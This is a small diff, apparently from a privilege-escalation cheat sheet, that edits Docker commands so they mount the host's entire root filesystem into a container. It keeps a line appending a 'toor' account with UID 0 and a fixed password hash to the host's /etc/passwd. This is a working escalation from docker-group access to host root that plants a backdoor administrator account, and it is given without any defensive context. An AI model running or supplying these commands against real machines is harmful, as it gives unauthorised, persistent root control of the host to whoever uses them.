@@ -1,4 +1,9 @@
-docker run -it --rm -v $PWD:/mnt bash
+#here root file will be in /mnt
+docker run -v /:/mnt -it alpine
+
+or
+
+docker run -it --rm -v /:/mnt bash
 echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
 
 or
